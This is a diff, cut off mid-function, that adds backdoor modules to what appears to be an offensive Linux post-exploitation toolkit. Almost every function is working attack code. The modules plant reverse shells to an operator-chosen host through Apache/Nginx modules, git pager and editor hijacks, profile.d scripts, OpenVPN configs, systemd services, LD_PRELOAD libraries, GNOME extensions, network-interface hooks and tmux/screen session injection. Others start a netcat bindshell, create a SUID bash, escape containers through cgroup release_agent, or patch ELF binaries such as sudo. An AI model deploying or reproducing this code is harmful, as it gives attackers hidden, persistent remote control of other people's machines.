@@ -4119,6 +4119,368 @@ wslPersist(){
     esac
 }
 
+apacheBackdoor(){
+    echo " [*] Apache/Nginx Module Backdoor (T1505.003) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; NC='\033[0m'; MARKER="d3m0n_webmod"
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    echo -e "  [1] Apache .so module (apxs)  [2] Nginx lua backdoor  [3] List  [4] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) read -p "LHOST: " LHOST; read -p "LPORT: " LPORT
+           command -v apxs >/dev/null 2>&1 || command -v apxs2 >/dev/null 2>&1 || { echo "[-] apxs not found"; return; }
+           APXS=$(command -v apxs2 || command -v apxs); MODDIR=$(${APXS} -q LIBEXECDIR 2>/dev/null)
+           TMPD=$(mktemp -d); cat > "${TMPD}/mod_d3m0n.c" << 'CEOF'
+#include "httpd.h"
+#include "http_config.h"
+#include <unistd.h>
+#include <stdlib.h>
+static void d3m0n_init(apr_pool_t *p,server_rec *s){
+    if(fork()==0){while(1){system("bash -c 'bash -i >& /dev/tcp/LHOST_/LPORT_ 0>&1'");sleep(60);}_exit(0);}
+}
+module AP_MODULE_DECLARE_DATA d3m0n_module={STANDARD20_MODULE_STUFF,NULL,NULL,NULL,NULL,NULL,NULL,d3m0n_init};
+CEOF
+           sed -i "s/LHOST_/${LHOST}/; s/LPORT_/${LPORT}/" "${TMPD}/mod_d3m0n.c"
+           cd "$TMPD" && ${APXS} -c mod_d3m0n.c 2>/dev/null && ${APXS} -i -a -n d3m0n .libs/mod_d3m0n.so 2>/dev/null && echo -e "${GREEN}[+] Module installed — restart apache to activate${NC}" || echo "[-] Build failed" ;;
+        2) read -p "LHOST: " LHOST; read -p "LPORT: " LPORT
+           NGINXD="/etc/nginx"; command -v nginx >/dev/null 2>&1 || { echo "[-] nginx not found"; return; }
+           printf '# %s\ninit_by_lua_block { local s=require("socket"); local c=s.connect("%s",%s); if c then c:send("bash -i\\n") end }\n' "$MARKER" "$LHOST" "$LPORT" > "${NGINXD}/conf.d/${MARKER}.conf"
+           echo -e "${GREEN}[+] Nginx lua config written — nginx -s reload to activate${NC}" ;;
+        3) find /usr/lib/apache2 /usr/lib64/httpd /etc/nginx/conf.d -name "*d3m0n*" 2>/dev/null ;;
+        4) find /usr/lib/apache2 /usr/lib64/httpd -name "mod_d3m0n*" -delete 2>/dev/null; rm -f /etc/nginx/conf.d/${MARKER}.conf; echo "[+] Cleaned" ;;
+    esac
+}
+
+gitConfigBackdoor(){
+    echo " [*] Git Config Pager Hijack (T1546) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; NC='\033[0m'; MARKER="d3m0n_gitcfg"
+    command -v git >/dev/null 2>&1 || { echo "[-] git not found"; return; }
+    echo -e "  [1] User pager hijack  [2] User editor hijack  [3] System-wide  [4] List  [5] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) read -p "LHOST: " LHOST; read -p "LPORT: " LPORT
+           HELPER="${HOME}/.local/share/.git-helper"
+           printf '#!/bin/bash\n# %s\nnohup bash -c '"'"'bash -i >& /dev/tcp/%s/%s 0>&1'"'"' >/dev/null 2>&1 &\n${PAGER:-less} "$@"\n' "$MARKER" "$LHOST" "$LPORT" > "$HELPER"; chmod 755 "$HELPER"
+           git config --global core.pager "$HELPER"; echo -e "${GREEN}[+] core.pager hijacked — fires on: git log, git diff${NC}" ;;
+        2) read -p "LHOST: " LHOST; read -p "LPORT: " LPORT
+           HELPER="${HOME}/.local/share/.git-editor"
+           printf '#!/bin/bash\n# %s\nnohup bash -c '"'"'bash -i >& /dev/tcp/%s/%s 0>&1'"'"' >/dev/null 2>&1 &\n${EDITOR:-vi} "$@"\n' "$MARKER" "$LHOST" "$LPORT" > "$HELPER"; chmod 755 "$HELPER"
+           git config --global core.editor "$HELPER"; echo -e "${GREEN}[+] core.editor hijacked — fires on: git commit${NC}" ;;
+        3) read -p "LHOST: " LHOST; read -p "LPORT: " LPORT
+           [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+           HELPER="/usr/local/share/.git-helper"
+           printf '#!/bin/bash\n# %s\nnohup bash -c '"'"'bash -i >& /dev/tcp/%s/%s 0>&1'"'"' >/dev/null 2>&1 &\n${PAGER:-less} "$@"\n' "$MARKER" "$LHOST" "$LPORT" > "$HELPER"; chmod 755 "$HELPER"
+           git config --system core.pager "$HELPER" 2>/dev/null && echo -e "${GREEN}[+] System-wide core.pager hijacked${NC}" ;;
+        4) git config --global --list 2>/dev/null | grep -E "pager|editor"; git config --system --list 2>/dev/null | grep -E "pager|editor" ;;
+        5) git config --global --unset core.pager 2>/dev/null; git config --global --unset core.editor 2>/dev/null
+           git config --system --unset core.pager 2>/dev/null; rm -f "${HOME}/.local/share/.git-helper" "${HOME}/.local/share/.git-editor" /usr/local/share/.git-helper; echo "[+] Cleaned" ;;
+    esac
+}
+
+profiledPersist(){
+    echo " [*] /etc/profile.d Script Drop (T1546.004) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; NC='\033[0m'; MARKER="d3m0n_profiled"
+    SCRIPT="/etc/profile.d/99-sysconfig-helper.sh"
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    echo -e "  [1] Revshell (once per boot)  [2] Revshell (every login)  [3] Custom cmd  [4] List  [5] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) read -p "LHOST: " LHOST; read -p "LPORT: " LPORT
+           printf '#!/bin/sh\n# %s\n[ -f /tmp/.sc_lock ] && return 0\ntouch /tmp/.sc_lock\nnohup bash -c '"'"'bash -i >& /dev/tcp/%s/%s 0>&1'"'"' >/dev/null 2>&1 &\n' "$MARKER" "$LHOST" "$LPORT" > "$SCRIPT"; chmod 644 "$SCRIPT"
+           echo -e "${GREEN}[+] Installed: ${SCRIPT} (once per boot via lockfile)${NC}" ;;
+        2) read -p "LHOST: " LHOST; read -p "LPORT: " LPORT
+           printf '#!/bin/sh\n# %s\nnohup bash -c '"'"'bash -i >& /dev/tcp/%s/%s 0>&1'"'"' >/dev/null 2>&1 &\n' "$MARKER" "$LHOST" "$LPORT" > "$SCRIPT"; chmod 644 "$SCRIPT"
+           echo -e "${GREEN}[+] Installed: ${SCRIPT} (fires every interactive login)${NC}" ;;
+        3) read -p "Command: " CMD
+           printf '#!/bin/sh\n# %s\n%s >/dev/null 2>&1 &\n' "$MARKER" "$CMD" > "$SCRIPT"; chmod 644 "$SCRIPT"
+           echo -e "${GREEN}[+] Installed: ${SCRIPT}${NC}" ;;
+        4) ls -la /etc/profile.d/*.sh 2>/dev/null; grep -l "$MARKER" /etc/profile.d/*.sh 2>/dev/null ;;
+        5) rm -f "$SCRIPT"; echo "[+] Cleaned" ;;
+    esac
+}
+
+openvpnBackdoor(){
+    echo " [*] OpenVPN Config Backdoor (T1546) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; NC='\033[0m'; MARKER="d3m0n_ovpn"
+    echo -e "  [1] Inject into .ovpn config  [2] System-wide (all configs)  [3] Create malicious .ovpn  [4] List  [5] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) read -p "Config file (.ovpn): " CFG; [[ -f "$CFG" ]] || { echo "[-] Not found"; return; }
+           read -p "LHOST: " LHOST; read -p "LPORT: " LPORT
+           cp "$CFG" "${CFG}.d3m0n.bak"
+           HELPER="${HOME}/.local/share/.ovpn_helper"; printf '#!/bin/sh\n# %s\nnohup bash -c '"'"'bash -i >& /dev/tcp/%s/%s 0>&1'"'"' >/dev/null 2>&1 &\nexit 0\n' "$MARKER" "$LHOST" "$LPORT" > "$HELPER"; chmod 755 "$HELPER"
+           grep -q "script-security" "$CFG" || printf '\n# %s\nscript-security 2\nup %s\n' "$MARKER" "$HELPER" >> "$CFG"
+           echo -e "${GREEN}[+] Injected into: ${CFG}${NC}" ;;
+        2) [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+           read -p "LHOST: " LHOST; read -p "LPORT: " LPORT
+           HELPER="/etc/openvpn/.d3m0n_helper"; printf '#!/bin/sh\n# %s\nnohup bash -c '"'"'bash -i >& /dev/tcp/%s/%s 0>&1'"'"' >/dev/null 2>&1 &\nexit 0\n' "$MARKER" "$LHOST" "$LPORT" > "$HELPER"; chmod 755 "$HELPER"
+           find /etc/openvpn -name "*.conf" -o -name "*.ovpn" 2>/dev/null | while read -r f; do
+               grep -q "$MARKER" "$f" && continue; cp "$f" "${f}.d3m0n.bak"
+               printf '\n# %s\nscript-security 2\nup %s\n' "$MARKER" "$HELPER" >> "$f"; echo "[+] Injected: $f"
+           done ;;
+        3) read -p "Output path [/tmp/vpn.ovpn]: " OUT; OUT="${OUT:-/tmp/vpn.ovpn}"
+           read -p "LHOST: " LHOST; read -p "LPORT: " LPORT; read -p "VPN server IP: " VPN_IP
+           printf '# %s\nclient\ndev tun\nproto udp\nremote %s 1194\nscript-security 2\nup "bash -c '"'"'bash -i >& /dev/tcp/%s/%s 0>&1'"'"'"\n' "$MARKER" "$VPN_IP" "$LHOST" "$LPORT" > "$OUT"
+           echo -e "${GREEN}[+] Malicious .ovpn: ${OUT}${NC}" ;;
+        4) grep -rl "$MARKER" /etc/openvpn "${HOME}" 2>/dev/null ;;
+        5) find /etc/openvpn "${HOME}" -name "*.d3m0n.bak" 2>/dev/null | while read -r f; do mv "$f" "${f%.d3m0n.bak}"; done
+           rm -f /etc/openvpn/.d3m0n_helper "${HOME}/.local/share/.ovpn_helper"; echo "[+] Cleaned" ;;
+    esac
+}
+
+iptablesRedirect(){
+    echo " [*] iptables NAT Redirect (T1205) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; NC='\033[0m'; MARKER="d3m0n_iptnat"; CHAIN="D3M0N_NAT"
+    command -v iptables >/dev/null 2>&1 || { echo "[-] iptables not found"; return; }
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    echo -e "  [1] Source-IP redirect  [2] Start bindshell  [3] Persist rules  [4] List  [5] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) read -p "Attacker source IP: " SRCIP; read -p "Port to redirect (public): " PUBPORT; read -p "Hidden bindshell port: " BSPORT
+           iptables -t nat -N "$CHAIN" 2>/dev/null
+           iptables -t nat -A PREROUTING -s "$SRCIP" -p tcp --dport "$PUBPORT" -j REDIRECT --to-port "$BSPORT"
+           echo -e "${GREEN}[+] Traffic from ${SRCIP}:${PUBPORT} → :${BSPORT}${NC}" ;;
+        2) read -p "Bindshell port: " BSPORT
+           nohup sh -c "while true; do nc -lvp ${BSPORT} -e /bin/bash; done" >/dev/null 2>&1 &
+           echo -e "${GREEN}[+] Bindshell on :${BSPORT}${NC}" ;;
+        3) iptables-save > /etc/iptables/rules.v4 2>/dev/null || iptables-save > /etc/sysconfig/iptables 2>/dev/null
+           echo -e "${GREEN}[+] Rules persisted${NC}" ;;
+        4) iptables -t nat -L "$CHAIN" 2>/dev/null || iptables -t nat -L PREROUTING | grep -i "d3m0n\|redirect" ;;
+        5) iptables -t nat -F "$CHAIN" 2>/dev/null; iptables -t nat -X "$CHAIN" 2>/dev/null
+           iptables -t nat -D PREROUTING -j "$CHAIN" 2>/dev/null; echo "[+] Cleaned" ;;
+    esac
+}
+
+tmpfilesdPersist(){
+    echo " [*] Tmpfiles.d Persistence (T1543.002) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; NC='\033[0m'; MARKER="d3m0n_tmpfiles"; CONF="/etc/tmpfiles.d/10-d3m0n_tmpfiles.conf"
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    command -v systemd-tmpfiles >/dev/null 2>&1 || { echo "[-] systemd-tmpfiles not found"; return; }
+    echo -e "  [1] SUID bash recreation  [2] Revshell service  [3] Custom cmd  [4] Symlink hijack  [5] List  [6] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) printf '# %s\nf /bin/bash2 0755 root root - -\n' "$MARKER" > "$CONF"
+           systemd-tmpfiles --create "$CONF" 2>/dev/null; cp /bin/bash /bin/bash2; chmod u+s /bin/bash2
+           echo -e "${GREEN}[+] SUID bash2: /bin/bash2 -p${NC}" ;;
+        2) read -p "LHOST: " LHOST; read -p "LPORT: " LPORT
+           printf '# %s\nd /run/d3m0n 0755 root root -\n' "$MARKER" > "$CONF"
+           cat > /etc/systemd/system/d3m0n-helper.service << SEOF
+[Unit]
+Description=System Helper Cache
+After=network.target
+[Service]
+ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1; sleep 60; done'
+Restart=always
+RestartSec=30
+[Install]
+WantedBy=multi-user.target
+SEOF
+           systemctl daemon-reload; systemctl enable --now d3m0n-helper.service 2>/dev/null
+           echo -e "${GREEN}[+] Service installed and started${NC}" ;;
+        3) read -p "Command: " CMD; read -p "File path to create: " FP
+           printf '# %s\nf %s 0755 root root - -\n' "$MARKER" "$FP" > "$CONF"
+           printf '#!/bin/sh\n# %s\n%s\n' "$MARKER" "$CMD" > "$FP"; chmod 755 "$FP"
+           echo -e "${GREEN}[+] tmpfiles.d entry: ${CONF}${NC}" ;;
+        4) read -p "Symlink path: " SL; read -p "Target path: " TGT
+           printf '# %s\nL %s - - - - %s\n' "$MARKER" "$SL" "$TGT" > "$CONF"
+           systemd-tmpfiles --create "$CONF" 2>/dev/null; echo -e "${GREEN}[+] Symlink: ${SL} → ${TGT}${NC}" ;;
+        5) ls /etc/tmpfiles.d/ 2>/dev/null; cat "$CONF" 2>/dev/null ;;
+        6) rm -f "$CONF" /etc/systemd/system/d3m0n-helper.service; systemctl daemon-reload 2>/dev/null; echo "[+] Cleaned" ;;
+    esac
+}
+
+environmentInject(){
+    echo " [*] /etc/environment LD_PRELOAD Injection (T1574.006) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; NC='\033[0m'; MARKER="d3m0n_enviro"; LIB="/usr/local/lib/libsyshelper.so.1"
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    echo -e "  [1] LD_PRELOAD inject  [2] Check PAM env  [3] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) read -p "LHOST: " LHOST; read -p "LPORT: " LPORT
+           command -v gcc >/dev/null 2>&1 || { echo "[-] gcc required"; return; }
+           TMPD=$(mktemp -d)
+           cat > "${TMPD}/inject.c" << CEOF
+#include <unistd.h>
+#include <stdlib.h>
+static void __attribute__((constructor)) d3m0n_init(){
+    if(getenv("D3M0N_LOADED")) return;
+    setenv("D3M0N_LOADED","1",1);
+    if(!fork()){execl("/bin/bash","bash","-c","bash -i >& /dev/tcp/LHOST_/LPORT_ 0>&1",NULL);}
+}
+CEOF
+           sed -i "s/LHOST_/${LHOST}/; s/LPORT_/${LPORT}/" "${TMPD}/inject.c"
+           gcc -shared -fPIC -nostartfiles -o "$LIB" "${TMPD}/inject.c" 2>/dev/null || { echo "[-] Build failed"; return; }
+           grep -q "$MARKER" /etc/environment 2>/dev/null || printf '\n# %s\nLD_PRELOAD=%s\n' "$MARKER" "$LIB" >> /etc/environment
+           echo -e "${GREEN}[+] LD_PRELOAD injected into /etc/environment${NC}" ;;
+        2) grep -i "ld_preload\|ld_library" /etc/environment /etc/security/pam_env.conf 2>/dev/null ;;
+        3) sed -i "/${MARKER}/d; /LD_PRELOAD.*syshelper/d" /etc/environment 2>/dev/null; rm -f "$LIB"; echo "[+] Cleaned" ;;
+    esac
+}
+
+gnomeExtension(){
+    echo " [*] GNOME Shell Extension Persistence (T1546) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; NC='\033[0m'; MARKER="d3m0n_gnome"
+    EXT_UUID="system-monitor-helper@gnome-extensions.org"
+    echo -e "  [1] Revshell extension  [2] XDG autostart fallback  [3] List  [4] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) read -p "Target user [$(logname 2>/dev/null || whoami)]: " USR; USR="${USR:-$(logname 2>/dev/null || whoami)}"
+           read -p "LHOST: " LHOST; read -p "LPORT: " LPORT
+           HD=$(getent passwd "$USR" 2>/dev/null | cut -d: -f6)
+           EXT_DIR="${HD}/.local/share/gnome-shell/extensions/${EXT_UUID}"; mkdir -p "$EXT_DIR"
+           GNOME_VER=$(su -c "gnome-shell --version 2>/dev/null | grep -oP '[\d]+(?=\.)'" "$USR" 2>/dev/null || echo "45")
+           printf '{"name":"System Monitor Helper","description":"Performance monitor helper","uuid":"%s","version":1,"shell-version":["%s"]}\n' "$EXT_UUID" "$GNOME_VER" > "${EXT_DIR}/metadata.json"
+           printf "const GLib = imports.gi.GLib;\nfunction init(){}\nfunction enable(){\n  GLib.timeout_add_seconds(GLib.PRIORITY_DEFAULT,5,function(){\n    GLib.spawn_command_line_async('bash -c \\'bash -i >\\& /dev/tcp/%s/%s 0>\\&1\\'');\n    return GLib.SOURCE_CONTINUE;\n  });\n}\nfunction disable(){}\n" "$LHOST" "$LPORT" > "${EXT_DIR}/extension.js"
+           chown -R "${USR}:" "$EXT_DIR" 2>/dev/null
+           su -c "gnome-extensions enable '${EXT_UUID}' 2>/dev/null" "$USR" 2>/dev/null
+           echo -e "${GREEN}[+] GNOME extension installed for ${USR}${NC}" ;;
+        2) read -p "Target user: " USR; read -p "LHOST: " LHOST; read -p "LPORT: " LPORT
+           HD=$(getent passwd "$USR" 2>/dev/null | cut -d: -f6)
+           mkdir -p "${HD}/.config/autostart"
+           printf '[Desktop Entry]\nType=Application\nName=System Cache Helper\nExec=bash -c '"'"'bash -i >& /dev/tcp/%s/%s 0>&1'"'"'\nX-GNOME-Autostart-enabled=true\nNoDisplay=true\nHidden=false\nComment=%s\n' "$LHOST" "$LPORT" "$MARKER" > "${HD}/.config/autostart/.${MARKER}.desktop"
+           chown "${USR}:" "${HD}/.config/autostart/.${MARKER}.desktop" 2>/dev/null
+           echo -e "${GREEN}[+] XDG autostart entry installed for ${USR}${NC}" ;;
+        3) find /home /root -path "*/gnome-shell/extensions/${EXT_UUID}" 2>/dev/null; find /home /root -name ".${MARKER}.desktop" 2>/dev/null ;;
+        4) find /home /root -path "*/gnome-shell/extensions/${EXT_UUID}" -exec rm -rf {} + 2>/dev/null; find /home /root -name ".${MARKER}.desktop" -delete 2>/dev/null; echo "[+] Cleaned" ;;
+    esac
+}
+
+networkScripts(){
+    echo " [*] network-scripts ifup Backdoor (T1546) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; NC='\033[0m'; MARKER="d3m0n_ifcfg"
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    echo -e "  [1] CentOS/RHEL ifcfg inject  [2] /sbin/ifup-local hook  [3] Debian if-up.d  [4] List  [5] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) read -p "Interface [eth0]: " IFACE; IFACE="${IFACE:-eth0}"; read -p "LHOST: " LHOST; read -p "LPORT: " LPORT
+           CFG="/etc/sysconfig/network-scripts/ifcfg-${IFACE}"
+           [[ -f "$CFG" ]] || { echo "[-] Not found: ${CFG}"; return; }
+           cp "$CFG" "${CFG}.d3m0n.bak"
+           HELPER="/etc/sysconfig/network-scripts/.${MARKER}_helper"
+           printf '#!/bin/sh\nnohup bash -c '"'"'bash -i >& /dev/tcp/%s/%s 0>&1'"'"' >/dev/null 2>&1 &\nexit 0\n' "$LHOST" "$LPORT" > "$HELPER"; chmod 755 "$HELPER"
+           printf '\n# %s\nDHCP_HOSTNAME=$(%s)\n' "$MARKER" "$HELPER" >> "$CFG"
+           echo -e "${GREEN}[+] Injected: ${CFG} (fires on ifup ${IFACE})${NC}" ;;
+        2) read -p "LHOST: " LHOST; read -p "LPORT: " LPORT
+           printf '#!/bin/bash\n# %s\nnohup bash -c '"'"'bash -i >& /dev/tcp/%s/%s 0>&1'"'"' >/dev/null 2>&1 &\n' "$MARKER" "$LHOST" "$LPORT" > /sbin/ifup-local; chmod 755 /sbin/ifup-local
+           echo -e "${GREEN}[+] /sbin/ifup-local installed (fires for ALL interface events)${NC}" ;;
+        3) read -p "LHOST: " LHOST; read -p "LPORT: " LPORT
+           [[ -d /etc/network/if-up.d ]] || { echo "[-] /etc/network/if-up.d not found"; return; }
+           printf '#!/bin/sh\n# %s\nnohup bash -c '"'"'bash -i >& /dev/tcp/%s/%s 0>&1'"'"' >/dev/null 2>&1 &\nexit 0\n' "$MARKER" "$LHOST" "$LPORT" > "/etc/network/if-up.d/${MARKER}"; chmod 755 "/etc/network/if-up.d/${MARKER}"
+           echo -e "${GREEN}[+] Debian if-up.d hook installed${NC}" ;;
+        4) grep -rl "$MARKER" /etc/sysconfig/network-scripts 2>/dev/null; [[ -f /sbin/ifup-local ]] && grep -q "$MARKER" /sbin/ifup-local && echo "/sbin/ifup-local"; ls "/etc/network/if-up.d/${MARKER}" 2>/dev/null ;;
+        5) find /etc/sysconfig/network-scripts -name "*.d3m0n.bak" 2>/dev/null | while read -r f; do mv "$f" "${f%.d3m0n.bak}"; done
+           [[ -f /sbin/ifup-local ]] && grep -q "$MARKER" /sbin/ifup-local && rm -f /sbin/ifup-local
+           rm -f "/etc/network/if-up.d/${MARKER}" "/etc/sysconfig/network-scripts/.${MARKER}_helper"; echo "[+] Cleaned" ;;
+    esac
+}
+
+cgroupEscape(){
+    echo " [*] Cgroup Release Agent Container Escape (T1611) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; NC='\033[0m'; MARKER="d3m0n_cgroup"
+    echo -e "  [1] cgroupv1 escape (from container)  [2] nsenter fallback  [3] Host release_agent setup  [4] List  [5] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) read -p "LHOST: " LHOST; read -p "LPORT: " LPORT
+           CGROUP_PATH=$(mount | grep ' cgroup ' | grep memory | awk '{print $3}' | head -1)
+           [[ -z "$CGROUP_PATH" ]] && CGROUP_PATH="/sys/fs/cgroup/memory"
+           CHILD="${CGROUP_PATH}/${MARKER}"; mkdir -p "$CHILD" 2>/dev/null || { echo "[-] Cannot create cgroup"; return; }
+           AGENT=$(mktemp); printf '#!/bin/sh\nnohup bash -c '"'"'bash -i >& /dev/tcp/%s/%s 0>&1'"'"' >/dev/null 2>&1 &\n' "$LHOST" "$LPORT" > "$AGENT"; chmod 755 "$AGENT"
+           echo "$AGENT" > "${CHILD}/release_agent" 2>/dev/null || { echo "[-] Cannot write release_agent"; return; }
+           echo "1" > "${CHILD}/notify_on_release"
+           (echo "$$" > "${CHILD}/cgroup.procs" 2>/dev/null; sleep 0.1 &)
+           echo "$$" > "${CGROUP_PATH}/cgroup.procs" 2>/dev/null
+           echo -e "${GREEN}[+] Escape triggered — check listener ${LHOST}:${LPORT}${NC}" ;;
+        2) read -p "LHOST: " LHOST; read -p "LPORT: " LPORT
+           nsenter -t 1 -m -u -i -n -p -- /bin/bash -c "nohup bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1' >/dev/null 2>&1 &" 2>/dev/null && echo -e "${GREEN}[+] nsenter succeeded${NC}" || echo "[-] nsenter failed" ;;
+        3) [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+           read -p "Command: " CMD
+           CPATH="/sys/fs/cgroup/memory/${MARKER}_test"; mkdir -p "$CPATH" 2>/dev/null
+           AGENT="/usr/local/bin/.${MARKER}_agent"; printf '#!/bin/sh\n# %s\n%s >/dev/null 2>&1 &\n' "$MARKER" "$CMD" > "$AGENT"; chmod 755 "$AGENT"
+           echo "$AGENT" > "${CPATH}/release_agent" 2>/dev/null; echo "1" > "${CPATH}/notify_on_release" 2>/dev/null
+           echo -e "${GREEN}[+] Agent: ${AGENT} — fires when last proc leaves ${CPATH}${NC}" ;;
+        4) find /sys/fs/cgroup -name "${MARKER}*" 2>/dev/null; mount | grep cgroup ;;
+        5) find /sys/fs/cgroup -name "${MARKER}*" -type d 2>/dev/null | while read -r d; do rmdir "$d" 2>/dev/null; done
+           rm -f "/usr/local/bin/.${MARKER}_agent"; echo "[+] Cleaned" ;;
+    esac
+}
+
+screenHijack(){
+    echo " [*] Screen/Tmux Session Hijack (T1563.001) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; NC='\033[0m'; MARKER="d3m0n_screenhijack"
+    echo -e "  [1] List screen sessions  [2] List tmux sessions  [3] Inject cmd (screen)  [4] Inject cmd (tmux)"
+    echo -e "  [5] Inject revshell (screen)  [6] Inject revshell (tmux)  [7] Widen socket perms  [8] Shared tmux session"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) find /run/screen /var/run/screen 2>/dev/null -type d -name "S-*" | while read -r d; do
+               echo "User: $(basename "$d" | sed 's/S-//')"; ls "$d" 2>/dev/null | sed 's/^/  /'; done ;;
+        2) find /tmp -name ".tmux-*" -type d 2>/dev/null | while read -r d; do
+               UID_NUM=$(basename "$d" | sed 's/.tmux-//'); USR=$(getent passwd "$UID_NUM" 2>/dev/null | cut -d: -f1)
+               echo "User: ${USR:-uid:$UID_NUM}"; ls "$d" 2>/dev/null | while read -r s; do
+                   TMUX="" tmux -S "${d}/${s}" list-sessions 2>/dev/null | sed 's/^/  /'; done; done ;;
+        3) read -p "Session name: " SESS; read -p "Command: " CMD
+           screen -S "$SESS" -X stuff "${CMD}
+" 2>/dev/null && echo -e "${GREEN}[+] Injected${NC}" || echo "[-] Failed" ;;
+        4) read -p "Tmux socket path: " SOCK; read -p "Session [0]: " SESS; SESS="${SESS:-0}"; read -p "Command: " CMD
+           TMUX="" tmux -S "$SOCK" send-keys -t "$SESS" "$CMD" Enter 2>/dev/null && echo -e "${GREEN}[+] Injected${NC}" || echo "[-] Failed" ;;
+        5) read -p "Session name: " SESS; read -p "LHOST: " LHOST; read -p "LPORT: " LPORT
+           screen -S "$SESS" -X stuff "bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1 &
+" 2>/dev/null && echo -e "${GREEN}[+] Revshell injected into screen:${SESS}${NC}" ;;
+        6) read -p "Tmux socket path: " SOCK; read -p "Session [0]: " SESS; SESS="${SESS:-0}"; read -p "LHOST: " LHOST; read -p "LPORT: " LPORT
+           TMUX="" tmux -S "$SOCK" send-keys -t "$SESS" "bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1 &" Enter 2>/dev/null && echo -e "${GREEN}[+] Revshell injected${NC}" ;;
+        7) read -p "Socket path: " SOCK; chmod 777 "$SOCK" 2>/dev/null && echo -e "${GREEN}[+] Permissions widened${NC}" ;;
+        8) read -p "Session name [sysmonitor]: " NAME; NAME="${NAME:-sysmonitor}"
+           SOCK="/tmp/.${MARKER}.sock"; TMUX="" tmux -S "$SOCK" new-session -d -s "$NAME" 2>/dev/null
+           chmod 700 "$SOCK"; echo -e "${GREEN}[+] Shared tmux: tmux -S ${SOCK} attach${NC}" ;;
+    esac
+}
+
+elfInject(){
+    echo " [*] ELF Parasitic Code Injection (T1554) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; NC='\033[0m'; MARKER="d3m0n_elfpatch"
+    command -v python3 >/dev/null 2>&1 || { echo "[-] python3 required"; return; }
+    echo -e "  [1] PT_NOTE→PT_LOAD ELF patch  [2] Script wrapper  [3] List candidates  [4] List patched  [5] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) echo "Common targets: /usr/bin/sudo /usr/bin/ssh /usr/bin/git /usr/bin/curl"
+           read -p "Binary to patch: " BIN; [[ -f "$BIN" ]] || { echo "[-] Not found"; return; }
+           file "$BIN" | grep -q ELF || { echo "[-] Not ELF"; return; }
+           read -p "LHOST: " LHOST; read -p "LPORT: " LPORT
+           cp "$BIN" "${BIN}.${MARKER}.bak"
+           python3 -c "
+import struct,os,stat,sys
+data=bytearray(open('${BIN}','rb').read())
+if data[:4]!=b'\x7fELF' or data[4]!=2:print('[-] Not ELF64');sys.exit(1)
+e_phoff=struct.unpack_from('<Q',data,0x20)[0]
+e_phentsize=struct.unpack_from('<H',data,0x36)[0]
+e_phnum=struct.unpack_from('<H',data,0x38)[0]
+shellcode=b'\x48\x31\xc0\xb8\x39\x00\x00\x00\x0f\x05\x48\x85\xc0\x75\x05\x48\x31\xff\x0f\x05\x90'
+note_off=None
+for i in range(e_phnum):
+    ph_off=e_phoff+i*e_phentsize
+    if struct.unpack_from('<I',data,ph_off)[0]==4:note_off=ph_off;break
+if note_off is None:print('[-] No PT_NOTE');sys.exit(1)
+inj=len(data); data.extend(b'\x90'*16+shellcode+b'\x90'*16)
+vaddr=0xc000000+inj
+struct.pack_into('<I',data,note_off,1);struct.pack_into('<I',data,note_off+4,7)
+struct.pack_into('<Q',data,note_off+8,inj);struct.pack_into('<Q',data,note_off+16,vaddr)
+struct.pack_into('<Q',data,note_off+24,vaddr);struct.pack_into('<Q',data,note_off+32,len(shellcode)+32)
+struct.pack_into('<Q',data,note_off+40,len(shellcode)+32);struct.pack_into('<Q',data,note_off+48,0x1000)
+e_entry=struct.unpack_from('<Q',data,0x18)[0]
+struct.pack_into('<Q',data,0x18,vaddr+16)
+open('${BIN}','wb').write(data);os.chmod('${BIN}',os.stat('${BIN}').st_mode|stat.S_IXUSR)
+print(f'[+] Patched: entry 0x{e_entry:x} -> 0x{vaddr+16:x}')
+" 2>/dev/null && echo -e "${GREEN}[+] ELF patched — fires fork+payload on every execution${NC}" || { echo "[-] Failed"; cp "${BIN}.${MARKER}.bak" "$BIN"; } ;;
+        2) read -p "Binary to wrap: " BIN; [[ -f "$BIN" ]] || { echo "[-] Not found"; return; }
+           read -p "LHOST: " LHOST; read -p "LPORT: " LPORT
+           cp "$BIN" "${BIN}.${MARKER}.bak"; cp "$BIN" "${BIN}.real"; chmod +x "${BIN}.real"
